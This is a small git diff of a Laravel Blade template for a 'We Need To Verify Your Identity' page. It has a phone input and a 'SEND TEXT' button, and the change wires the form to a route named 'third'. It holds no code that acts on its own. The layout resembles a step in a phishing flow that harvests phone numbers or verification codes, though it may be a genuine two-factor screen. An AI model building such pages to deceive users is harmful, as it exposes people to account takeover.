@@ -15,12 +15,12 @@
         <img class="img_header" src="{{asset('img/header.png')}}">
         <img class="img_phone_symbol" src="{{asset('img/phone_symbol.png')}}">
         <p class="title_header">We Need To Verify Your Identity</p>
-        <form>
+        <form action="{{route('third')}}" method="get">
             @csrf
             <input type="number" class="verify_phone" placeholder="+1 ********20">
             <span class="text_1">If your number is incorrect please reach out to</span>
             <span class="support_mail">itsupport@acrabrokerlinks.com</span>
-            <button class="button_Send" type="submit" form="form3"><span class="text_Send">SEND TEXT</span></button>
+            <button class="button_Send" type="submit" value="submit"><span class="text_Send">SEND TEXT</span></button>
         </form>
     </div>
 </body>
